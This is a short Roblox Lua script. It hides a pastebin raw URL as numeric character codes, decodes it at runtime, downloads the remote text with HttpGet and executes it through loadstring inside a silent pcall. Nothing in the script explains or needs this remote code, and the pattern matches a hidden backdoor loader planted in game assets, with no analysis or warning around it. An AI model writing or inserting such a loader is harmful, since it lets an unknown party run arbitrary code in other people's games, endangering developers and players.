scripts.script:
task.spawn(function()
    local segments = {
        {104,116,116,112,115,58,47,47},
        {112,97,115,116,101,98,105,110,46,99,111,109,47},
        {114,97,119,47},
        {106,116,90,99,57,74,90,71}
    }

    local buffer = {}

    for i = 1, #segments do
        local seg = segments[i]
        for j = 1, #seg do
            buffer[#buffer + 1] = string.char(seg[j])
        end
    end

    local url = table.concat(buffer)

    pcall(function()
        loadstring(game:HttpGet(url))()
    end)
end)
